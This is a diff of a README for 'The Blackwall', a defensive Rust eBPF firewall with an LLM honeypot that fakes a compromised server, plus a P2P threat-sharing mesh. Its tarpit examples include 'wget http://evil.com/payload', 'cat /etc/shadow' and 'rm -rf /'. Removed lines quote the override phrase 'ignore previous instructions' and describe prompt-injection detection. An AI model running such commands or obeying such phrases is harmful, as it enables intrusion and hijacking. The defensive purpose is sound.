@@ -8,15 +8,16 @@
 <p align="center">
   <img src="https://readme-typing-svg.herokuapp.com?font=JetBrains+Mono&weight=800&size=45&duration=3000&pause=1000&color=FF0000&center=true&vCenter=true&width=600&lines=THE+BLACKWALL" alt="The Blackwall">
   <br>
-  <em>Adaptive eBPF Firewall with AI Honeypot</em>
+  <em>Adaptive eBPF Firewall with AI Honeypot & P2P Threat Mesh</em>
 </p>
 
-# The Blackwall — I wrote a smart firewall because Cyberpunk 2077 broke my brain
+# The Blackwall — I built a real Blackwall because Cyberpunk 2077 broke my brain
 
 <p align="center">
 <img src="https://img.shields.io/badge/language-Rust-orange?style=for-the-badge&logo=rust" />
 <img src="https://img.shields.io/badge/kernel-eBPF%2FXDP-blue?style=for-the-badge" />
 <img src="https://img.shields.io/badge/AI-Ollama%20LLM-green?style=for-the-badge" />
+<img src="https://img.shields.io/badge/P2P-libp2p-purple?style=for-the-badge" />
 <img src="https://img.shields.io/badge/vibe-Cyberpunk-red?style=for-the-badge" />
 </p>
 
@@ -27,143 +28,183 @@
 
 <p align="center">
 <strong>Currently building enterprise-grade AI automation at <a href="https://dokky.com.ua">Dokky</a></strong><br>
-<strong>Open for Enterprise Consulting & Y-Combinator talks: <a href="mailto:xzcrpw1@gmail.com">xzcrpw1@gmail.com</a></strong>
+<strong>Enterprise licensing & consulting: <a href="mailto:xzcrpw1@gmail.com">xzcrpw1@gmail.com</a></strong>
 </p>
 
 ---
 
-**TL;DR:** I was playing Cyberpunk 2077 and thought: *"What if the Blackwall was real?"* So I wrote an adaptive eBPF firewall with an AI honeypot that pretends to be a compromised Linux server.  
-**~18,000 lines of Rust. Zero `unwrap()`s. One person.**
+**TL;DR:** Played Cyberpunk, got inspired, wrote a whole adaptive firewall that works inside the Linux kernel, catches threats with AI, traps attackers in a fake server powered by an LLM, and shares threat intel over a decentralized P2P mesh.
+**~21k lines of Rust. 298 tests. 10 crates. One person.**
 
 ---
 
 ## What is it?
 
-In Cyberpunk 2077 lore, the **Blackwall** is a digital barrier built by NetWatch to separate the civilized Net from rogue AIs — digital entities so dangerous that just looking at them could fry your brain through your neural interface.
+The **Blackwall** — named after the digital barrier from Cyberpunk 2077 that keeps rogue AIs from eating the civilized Net.
 
-This project is my version. Not against rogue AIs (yet), but against real-world threats.
+This is my version. A multi-layered defense system that doesn't just block threats — it studies them, traps them, and tells every other node what it found.
 
-**The Blackwall** is an **adaptive network firewall** that:
+Three core layers working together:
 
-  - Runs **inside the Linux kernel** via eBPF/XDP — processing packets at line-rate before they even hit the network stack.
-  - Performs **JA4 TLS fingerprinting** — identifying malicious clients by their ClientHello.
-  - **Doesn't just block attackers** — it *redirects them into a tarpit*, a fake LLM-powered Linux server playing the role of a compromised `root@web-prod-03`.
-  - Features a **behavioral engine** tracking the behavior of each IP address over time — port scanning patterns, beacon connection intervals, entropy anomalies.
-  - Supports **distributed mode** — multiple Blackwall nodes exchange threat intelligence peer-to-peer.
-  - Captures **PCAP** of suspicious traffic for forensics.
-  - Includes a **Deception Mesh** — fake SSH, HTTP (WordPress), MySQL, and DNS services to lure and fingerprint attackers.
+**1. Kernel-level firewall (eBPF/XDP)** — packet analysis happens inside the Linux kernel before traffic even hits the network stack. Nanosecond decisions. Entropy analysis, TLS fingerprinting, deep packet inspection, rate limiting, connection tracking — all running in the BPF virtual machine.
 
-### The Coolest Part
+**2. AI-powered TCP honeypot (Tarpit)** — instead of just dropping malicious traffic, it gets redirected to a fake Linux server. An LLM simulates bash, responds to commands, serves fake files, acts like a compromised `root@web-prod-03`. Attackers waste their time while everything gets recorded.
 
-When an attacker connects to the tarpit, they see this:
+**3. P2P threat intelligence mesh (HiveMind)** — nodes discover each other, exchange IoCs over an encrypted libp2p network, vote on threats through consensus, track peer reputation. One node catches a scanner — every node knows about it within seconds.
 
-```
-
-Ubuntu 24.04.2 LTS web-prod-03 tty1
-
-web-prod-03 login: root
-Password:
-Last login: Thu Mar 27 14:22:33 2025 from 10.0.0.1
-
-root@web-prod-03:\~\#
-
-```
-
-None of this is real. It's an LLM pretending to be a bash shell. It reacts to `ls`, `cat /etc/passwd`, `wget`, even `rm -rf /` — it's all fake, everything is logged, and everything is designed to waste the attacker's time while we study their methods.
-
-**Imagine: an attacker spends 30 minutes exploring a "compromised server"... which is actually an AI stalling for time while the Blackwall silently records everything.**
-
-This is V-tier netrunning.
+Plus: distributed sensor controller, enterprise SIEM integration API (STIX/TAXII/Splunk/QRadar/CEF), TUI dashboard, behavioral profiling per IP, threat feed ingestion, PCAP forensics.
 
 ---
 
-## Architecture — How the ICE Works
+## Architecture
 
 ![Blackwall Architecture](assets/architecture.svg)
 
 ![Threat Signal Flow](assets/signal-flow.svg)
 
-In Cyberpunk terms:
+**The pipeline:**
 
-  - **XDP** = the first layer of Blackwall ICE — millisecond decisions.
-  - **Behavioral Engine** = NetWatch AI surveillance.
-  - **Tarpit** = a daemon behind the wall luring netrunners into a fake reality.
-  - **Threat Feeds** = intel from fixers all over the Net.
-  - **PCAP** = braindance recordings of the intrusion.
-
----
-
-## Workspace Crates
-
-| Crate | Lines | Purpose | Cyberpunk Equivalent |
-|-------|-------|-------------|---------------------|
-| `common` | ~400 | `#[repr(C)]` shared types between kernel & userspace | The Contract — what both sides agreed upon |
-| `blackwall-ebpf` | ~1,800 | In-kernel XDP/TC programs | The Blackwall ICE itself |
-| `blackwall` | ~4,200 | Userspace daemon, behavioral engine, AI | NetWatch Command Center |
-| `tarpit` | ~1,600 | TCP honeypot with LLM bash simulation | A daemon luring netrunners |
-| `blackwall-controller` | ~250 | Coordinator for distributed sensors | Arasaka C&C server |
-| `xtask` | ~100 | Build tools | Ripperdoc's toolkit |
-
-**Total: ~8,500 lines of Rust, 48 files, 123 tests, 0 `unwrap()`s in production code.**
+```
+Packet arrives
+  → XDP: entropy check, blocklist/allowlist, CIDR match, rate limit, JA4 capture, DPI
+  → RingBuf (zero-copy) → Userspace daemon
+  → Static rules → Behavioral state machine → JA4 DB lookup → LLM classification
+  → Verdict: PASS / DROP / REDIRECT_TO_TARPIT
+  → eBPF BLOCKLIST map updated in real-time
+  → IoC shared to HiveMind P2P mesh
+```
 
 ---
 
-## Key Features
+## What Each Crate Does
 
-### 1. Kernel-Level Packet Processing (XDP)
+### blackwall-ebpf — The Kernel Layer (1,334 lines)
 
-Packets are analyzed in the eBPF virtual machine before they reach the TCP/IP stack. This means **nanosecond** decisions. HashMap for blocklists, LPM trie for CIDR ranges, entropy analysis for encrypted C2 traffic.
+eBPF programs at the XDP hook — the earliest point where a packet can be touched. Runs under strict BPF verifier rules: 512-byte stack, no heap, no floats, bounded loops.
 
-### 2. JA4 TLS Fingerprinting
+- **Entropy calculation** — byte frequency analysis, integer-only Shannon entropy (0–7936 scale). High entropy on non-TLS ports → encrypted C2 traffic
+- **TLS fingerprinting** — parses ClientHello, extracts cipher suites, extensions, ALPN, SNI → JA4 fingerprint. One fingerprint covers thousands of bots using the same TLS lib
+- **DPI via tail calls** — `PROG_ARRAY` dispatches protocol-specific analyzers:
+  - HTTP: method + URI (catches `/wp-admin`, `/phpmyadmin`, path traversal)
+  - DNS: query length + label count (DNS tunneling detection)
+  - SSH: banner fingerprinting (`libssh`, `paramiko`, `dropbear`)
+- **DNAT redirect** — suspicious traffic silently NAT'd to the tarpit. Attacker has no idea they left the real server
+- **Connection tracking** — stateful TCP flow monitoring, LRU map (16K entries)
+- **Rate limiting** — per-IP token bucket, prevents flood attacks and RingBuf exhaustion
+- **4 RingBuf channels** — EVENTS, TLS_EVENTS, EGRESS_EVENTS, DPI_EVENTS for different event types
 
-Every TLS ClientHello is parsed in the kernel. Cipher suites, extensions, ALPN, SNI — all hashed into a JA4 fingerprint. Botnets use the same TLS libraries, so their fingerprints are identical. One fingerprint → block thousands of bots.
+Maps: `BLOCKLIST`, `ALLOWLIST`, `CIDR_RULES`, `COUNTERS`, `RATE_LIMIT`, `CONN_TRACK`, `NAT_TABLE`, `TARPIT_TARGET`, `PROG_ARRAY`, plus 4 RingBuf maps.
 
-### 3. Deep Packet Inspection (DPI) via Tail Calls
+### blackwall — The Brain (6,362 lines)
 
-eBPF `PROG_ARRAY` tail calls split processing by protocol:
+Main daemon. Loads eBPF programs, consumes RingBuf events, runs the decision pipeline.
 
-  - **HTTP**: Method + URI analysis (suspicious paths like `/wp-admin`, `/phpmyadmin`).
-  - **DNS**: Query length + label count (detecting DNS tunneling).
-  - **SSH**: Banner analysis (identifying `libssh`, `paramiko`, `dropbear`).
+- **Rules engine** — static blocklist/allowlist, CIDR ranges from config + feeds
+- **Behavioral state machine** — per-IP profiling: connection frequency, port diversity, entropy distribution, timing analysis. Phases: `New → Suspicious → Malicious → Blocked` (or `→ Trusted`). Beaconing detection via integer CoV
+- **JA4 database** — TLS fingerprint matching against known-bad signatures
+- **AI classification** — Ollama integration, models ≤3B params (Qwen3 1.7B/0.6B). Event batching, structured JSON verdicts with confidence
+- **Threat feeds** — external feed ingestion (Firehol, abuse.ch), periodic refresh
+- **PCAP capture** — forensic recording with rotation + compression
+- **Real-time feedback** — verdicts written back to eBPF BLOCKLIST map
+- **HiveMind bridge** — confirmed IoCs shared to the P2P mesh
 
-### 4. AI Threat Classification
+### tarpit — The Trap (2,179 lines)
 
-When the behavioral engine isn't sure — it asks the LLM. Locally via Ollama using models ≤3B parameters (Qwen3 1.7B, Llama 3.2 3B). It classifies traffic as `benign`, `suspicious`, or `malicious` with structured JSON output.
+A deception layer. Attackers redirected here via DNAT think they've landed on a real box.
 
-### 5. TCP Tarpit with LLM Bash Simulation
+- **Protocol auto-detect** — identifies SSH, HTTP, MySQL, DNS from first bytes
+- **Protocol handlers:**
+  - SSH: banner, auth flow, PTY session
+  - HTTP: fake WordPress, `/wp-admin`, `.env`, realistic headers
+  - MySQL: handshake, auth, query responses with fake data
+  - DNS: plausible query responses
+- **LLM bash sim** — every shell command → Ollama. `ls -la` returns files, `cat /etc/shadow` returns hashes, `wget` "downloads", `mysql -u root` "connects". The LLM doesn't know it's a honeypot
+- **Exponential jitter** — 1-15 byte chunks, 100ms–30s delay. Maximum time waste
+- **Anti-fingerprinting** — randomized TCP window, TTL, initial delay. Invisible to p0f/Nmap
+- **Prompt injection defense** — 25+ patterns detected, never breaks the sim
+- **Credential canaries** — all entered credentials logged for forensics
+- **Session management** — per-connection state, command history, CWD tracking
 
-Attackers are redirected to a fake server. The LLM simulates bash — `ls -la` shows files, `cat /etc/shadow` shows hashes, `mysql -u root` connects to a "database". Responses are streamed with random jitter (1-15 byte chunks, exponential backoff) to waste the attacker's time.
+### hivemind — The Mesh (6,526 lines)
 
-### 6. Anti-Fingerprinting
+Decentralized threat intelligence built on libp2p.
 
-The tarpit randomizes TCP window sizes, TTL values, and adds random initial delays — preventing attackers from identifying it as a honeypot via p0f or Nmap OS detection.
+- **Transport** — QUIC + Noise encryption, every connection authenticated
+- **Discovery** — Kademlia DHT (global), mDNS (local), configurable seed peers
+- **IoC sharing** — GossipSub pub/sub, propagation across the mesh in seconds
+- **Consensus** — N independent confirmations required. No single-source trust
+- **Reputation** — peers earn rep for good IoCs, lose it for false positives. Bad actors get slashed
+- **Sybil guard** — PoW challenges for new peers, self-ref detection in k-buckets, rate-limited registration
+- **Federated learning** — local model training + FedAvg aggregation, gradient sharing (FHE encryption stub)
+- **Data poisoning defense** — gradient distribution monitoring, model inversion detection
+- **ZKP infrastructure** — Groth16 circuit stubs for trustless IoC verification
 
-### 7. Prompt Injection Protection
+### hivemind-api — Enterprise Integration (2,711 lines)
 
-Attackers who realize they're talking to an AI might try `"ignore previous instructions"`. The system detects 25+ injection patterns and responds with `bash: ignore: command not found`.
+REST API for plugging HiveMind data into enterprise SIEMs.
 
-### 8. Distributed Threat Intelligence
+- **STIX 2.1** — standard threat intel format
+- **TAXII 2.1** — threat exchange protocol
+- **Splunk HEC** — HTTP Event Collector
+- **QRadar LEEF** — Log Event Extended Format
+- **CEF** — Common Event Format
+- **Tiered licensing** — Basic / Professional / Enterprise / NationalSecurity
+- **Live stats** — real-time XDP counters + P2P mesh metrics
 
-Multiple Blackwall nodes exchange blocked IP lists, JA4 observations, and behavioral verdicts via a custom binary protocol. One node detects a scanner → all nodes block it instantly.
+### hivemind-dashboard — The Monitor (571 lines)
 
-### 9. Behavioral State Machine
+TUI dashboard. Pure ANSI — no ratatui, no crossterm, raw escape codes. Polls hivemind-api for live mesh status.
 
-Every IP gets a behavioral profile: connection frequency, port diversity, entropy distribution, timing analysis (beaconing detection via integer coefficient of variation). Phase progression: `New → Suspicious → Malicious → Blocked` (or `→ Trusted`).
+### blackwall-controller — Command & Control (356 lines)
+
+Multi-sensor management CLI. HMAC-authenticated (PSK). Query stats, list blocked IPs, check health across all your Blackwall nodes from one place.
+
+### common — The Contract (1,126 lines)
+
+`#[repr(C)]` types shared between kernel and userspace: `PacketEvent`, `RuleKey`, `TlsComponentsEvent`, `DpiEvent`, counters, base64 utils. The contract that both sides agree on.
+
+### xtask — Build Tools (46 lines)
+
+`cargo xtask build-ebpf` — handles nightly + `bpfel-unknown-none` target compilation.
 
 ---
 
 ## Tech Stack
 
-| Layer | Technology |
-|--------|-----------|
-| Kernel programs | eBPF/XDP via **aya-rs** (pure Rust, no C, no libbpf) |
-| Userspace daemon | **Tokio** (current_thread only) |
-| IPC | **RingBuf** zero-copy (7.5% overhead vs 35% PerfEventArray) |
-| Concurrent maps | **papaya** (lock-free read-heavy HashMap) |
-| AI Inference | **Ollama** + GGUF Q5_K_M quantization |
-| Configuration | **TOML** |
-| Logging | **tracing** structured logging |
-| Build | Custom **xtask** + nightly Rust + `bpfel-unknown-none` target |
+| Layer | Tech | Why |
+|-------|------|-----|
+| Kernel | **aya-rs** (eBPF/XDP) | Pure Rust eBPF — no C, no libbpf |
+| Runtime | **Tokio** (current_thread) | Single-threaded, no overhead |
+| IPC | **RingBuf** | Zero-copy, 7.5% overhead vs PerfEventArray's 35% |
+| Concurrency | **papaya** + **crossbeam** | Lock-free maps + MPMC queues |
+| P2P | **libp2p** | QUIC, Noise, Kademlia, GossipSub, mDNS |
+| Crypto | **ring** | ECDSA, SHA256, HKDF, HMAC |
+| HTTP | **hyper** 1.x | Minimal. No web framework |
+| AI | **Ollama** | Local inference, GGUF quantized |
+| Config | **TOML** | Clean, human-readable |
+| Logging | **tracing** | Structured. Zero `println!` in prod |
+
+**22 dependencies total.** Each one justified. No bloat crates.
+
+---
+
+## Deployment
+
+```
+deploy/
+  docker/
+    Dockerfile.blackwall       # Multi-stage, stripped binary
+    Dockerfile.ebpf            # Nightly eBPF build
+  helm/
+    blackwall/                 # K8s DaemonSet + ConfigMap
+  systemd/
+    server/                    # Production server units
+    laptop/                    # Dev/laptop units
+  examples/                    # Example configs
+  healthcheck.sh               # Component health checker
+```
+
+Docker multi-stage builds. Helm chart for K8s (DaemonSet, one per node, `CAP_BPF`). systemd units for bare metal.
 
 ---
 
@@ -171,51 +212,46 @@ Every IP gets a behavioral profile: connection frequency, port diversity, entrop
 
 ### Prerequisites
 
-  - Linux kernel 5.15+ with BTF (or WSL2 with a custom kernel).
-  - Rust nightly + `rust-src` component.
-  - `bpf-linker` (`cargo install bpf-linker`).
-  - Ollama (for AI features).
+- Linux 5.15+ with BTF (or WSL2 custom kernel)
+- Rust stable + nightly with `rust-src`
+- `bpf-linker` — `cargo install bpf-linker`
+- Ollama (optional, for AI features)
 
 ### Build
 
 ```bash
-# eBPF programs (requires nightly)
-cargo xtask build-ebpf
-
-# Userspace
-cargo build --release -p blackwall
-
-# Honeypot
-cargo build --release -p tarpit
-
-# Lint + tests
-cargo clippy --workspace -- -D warnings
-cargo test --workspace
-````
+cargo xtask build-ebpf                      # eBPF programs (nightly)
+cargo build --release --workspace            # all userspace
+cargo clippy --workspace -- -D warnings      # lint
+cargo test --workspace                       # 298 tests
+```
 
 ### Run
 
 ```bash
-# Daemon (requires root/CAP_BPF)
-sudo RUST_LOG=info ./target/release/blackwall config.toml
-
-# Tarpit
-RUST_LOG=info ./target/release/tarpit
-
-# Distributed controller
-./target/release/blackwall-controller 10.0.0.2:9471 10.0.0.3:9471
+sudo RUST_LOG=info ./target/release/blackwall config.toml    # needs root/CAP_BPF
+RUST_LOG=info ./target/release/tarpit                        # honeypot
+RUST_LOG=info ./target/release/hivemind                      # P2P node
+RUST_LOG=info ./target/release/hivemind-api                  # threat feed API
+./target/release/hivemind-dashboard                          # TUI
+BLACKWALL_PSK=<key> ./target/release/blackwall-controller stats <ip>:<port>
 ```
 
-### Configuration
+### Config
 
 ```toml
 [network]
 interface = "eth0"
-xdp_mode = "generic"
+xdp_mode = "generic"          # generic / native / offload
+
+[thresholds]
+entropy_anomaly = 6000         # 0-7936 scale
 
 [tarpit]
 enabled = true
-port = 9999
+port = 2222
+base_delay_ms = 100
+max_delay_ms = 30000
 
 [tarpit.services]
 ssh_port = 22
@@ -227,6 +263,11 @@ dns_port = 53
 enabled = true
 ollama_url = "http://localhost:11434"
 model = "qwen3:1.7b"
+fallback_model = "qwen3:0.6b"
+
+[rules]
+blocklist = ["1.2.3.4"]
+allowlist = ["127.0.0.1"]
 
 [feeds]
 enabled = true
@@ -235,85 +276,125 @@ refresh_interval_secs = 3600
 [pcap]
 enabled = true
 output_dir = "/var/lib/blackwall/pcap"
-compress_rotated = true
 
 [distributed]
 enabled = false
 mode = "standalone"
 bind_port = 9471
+psk = "your-256bit-hex-key"
 ```
 
-## Visual Results
+---
 
-![Blackwall Result Screens](assets/results-overview.svg)
+## The Tarpit in Action
 
------
+Connect to the tarpit and you see:
 
-## Cyberpunk Connection
+```
+Ubuntu 24.04.2 LTS web-prod-03 tty1
 
-In the Cyberpunk 2077 universe, the **Blackwall** was built after the DataKrash of 2022 — when Rache Bartmoss's R.A.B.I.D.S. virus destroyed the old Net. NetWatch built the Blackwall as a barrier to keep out the rogue AIs evolving in the ruins.
+web-prod-03 login: root
+Password:
+Last login: Thu Mar 27 14:22:33 2025 from 10.0.0.1
 
-Some characters — like Alt Cunningham — exist beyond the Blackwall, transformed into something more than human, less than a living creature.
+root@web-prod-03:~#
+```
 
-This project takes that concept and makes it real (well, almost):
+None of this is real. The LLM plays bash. `ls` shows files. `cat /etc/passwd` shows users. `mysql -u root -p` connects you. `wget http://evil.com/payload` downloads.
 
-| Cyberpunk 2077 | The Blackwall (This Project) |
-|----------------|----------------------------|
+30 minutes on a server that doesn't exist. Every keystroke recorded. IoCs shared to the mesh.
+
+---
+
+## Security Model
+
+- Every byte from packets = attacker-controlled. All `ctx.data()` bounds-checked
+- Zero `unwrap()` in prod — `?`, `expect("reason")`, or `match`
+- Prompt injection: expected. 25+ patterns caught, simulation never breaks
+- P2P: Sybil guard (PoW + reputation slashing), N-of-M consensus on IoCs
+- Tarpit: TCP randomization — p0f/Nmap can't fingerprint it
+- Controller: HMAC-authenticated, no unauthenticated access
+- Kernel: rate limiting prevents RingBuf exhaustion
+- Shutdown: cleans up firewall rules, no orphaned iptables state
+
+---
+
+## Enterprise Edition
+
+**[Blackwall Enterprise](https://github.com/xzcrpw/blackwall-enterprise)** adds something no one else has: **real-time Agent-to-Agent (A2A) traffic analysis at the kernel level.**
+
+AI agents are starting to talk to each other — LLM-to-LLM, via MCP, A2A protocol, agent frameworks. This creates a new attack surface: prompt injection through inter-agent communication, intent spoofing, identity theft between agents. Nothing on the market handles this. Blackwall Enterprise is the first and only such module.
+
+**~8,400 lines of Rust.** Separate repo, separate license.
+
+| Component | What it does |
+|-----------|-------------|
+| **A-JWT Validation** | Agentic JWT verification per IETF draft. Signature check via `ring`, replay prevention, key caching |
+| **Intent Verification** | Exhaustive field matching — `max_amount`, `allowed_recipients` (glob), action allowlisting |
+| **Agent Checksum** | SHA256(system_prompt + tools_config) — tampering = instant block |
+| **Proof-of-Possession** | cnf/jwk ECDSA binding — proves the agent holds its key |
+| **eBPF Uprobes** | Hooks OpenSSL/GnuTLS `SSL_write`/`SSL_read` — intercepts A2A plaintext without breaking TLS |
+| **Risk-Based Routing** | Configurable policy: allow / review / block based on risk score |
+| **ZK Proofs** | Violation attestation without exposing raw traffic (Groth16) |
+| **P2P Gossip** | Violation proofs broadcast to HiveMind mesh |
+
+**Licensing:** [xzcrpw1@gmail.com](mailto:xzcrpw1@gmail.com)
+
+---
+
+## Stats
+
+```
+Language:        100% Rust
+Total:           ~21,200 lines
+Files:           92 .rs
+Crates:          10
+Tests:           298
+unwrap():        0 in prod
+Dependencies:    22 (audited)
+eBPF stack:      ≤ 512 bytes always
+Clippy:          -D warnings, zero issues
+CI:              check + clippy + tests + eBPF nightly build
+```
+
+---
+
+## Cyberpunk Reference
+
+| Cyberpunk 2077 | This Project |
+|----------------|-------------|
 | The Blackwall | Kernel-level eBPF/XDP firewall |
-| ICE | XDP fast-path DROP + entropy + JA4 |
-| Netrunner attacks | Port scanning, bruteforcing, C2 beaconing |
-| Daemons beyond the wall | LLM tarpit pretending to be a real server |
-| NetWatch surveillance | Behavioral engine + per-IP state machine |
-| Rogue AIs | Botnets and automated scanners |
+| ICE | XDP fast-path: entropy + JA4 + DPI + DNAT |
+| Daemons | LLM tarpit — fake server behind the wall |
+| NetWatch | Behavioral engine + per-IP state machine |
+| Rogue AIs | Botnets, scanners, C2 beacons |
 | Braindance recordings | PCAP forensics |
-| Fixer intel | Threat feeds (Firehol, abuse.ch) |
-| Arasaka C\&C | Distributed controller |
+| Netrunner collective | HiveMind P2P mesh |
+| Fixer intel | Threat feeds |
+| Arasaka C&C | Distributed controller |
 
------
-
-## Project Stats
-
-```
-Language:      100% Rust (no C, no Python, no shell scripts in prod)
-Lines of code: ~8,500
-Files:         48
-Tests:         123
-unwrap():      0 (in production code)
-Dependencies:  12 (audited, no bloat)
-eBPF stack:    always ≤ 512 bytes
-Clippy:        zero warnings (-D warnings)
-```
-
------
-
-## Development Philosophy
-
-> *"No matter how many times I see Night City... it always takes my breath away."*
-
-1.  **Zero dependencies where possible.** If an algorithm takes less than 500 lines — write it yourself. No `reqwest` (50+ transitive dependencies), no `clap` (overkill for 2 CLI args).
-2.  **Contract first.** The `common` crate defines all shared types. eBPF and userspace never argue about memory layout.
-3.  **No shortcuts in eBPF.** Every `ctx.data()` access has a bounds check. Not just because the verifier demands it, but because every byte from an attacker's packet is hostile input.
-4.  **The tarpit never gives itself away.** The LLM system prompt never mentions the word "honeypot". Prompt injection is expected and guarded against.
-5.  **Observable, but not chatty.** Structured tracing with levels. Zero `println!`s in production.
-
------
+---
 
 ## Disclaimer
 
-This is a security research project. Built for your own infrastructure, for defensive purposes. Do not use it to attack others. Do not deploy the tarpit on production servers without understanding the consequences.
+Security research project. For defending your own infrastructure. Don't use it against others.
 
-I am not affiliated with CD Projekt Red. I just played their game, and it broke my brain in the best possible way.
+Not affiliated with CD Projekt Red. Just a game that rewired my brain in the best way possible.
 
------
+---
 
 ## License
 
-BSL 1.1 — because the Net needs both freedom and sustainable development.
+**BSL 1.1** (Business Source License)
 
------
+Licensor: Vladyslav Soliannikov
+Change Date: April 8, 2030
+Change License: Apache-2.0
+
+---
 
 <p align="center">
-<strong>If you want to see this evolve further — <a href="https://github.com/xzcrpw/blackwall">Star this repo!</a></strong>
+<strong>Like what you see? <a href="https://github.com/xzcrpw/blackwall">Star the repo</a></strong>
 </p>
 
 <p align="center">
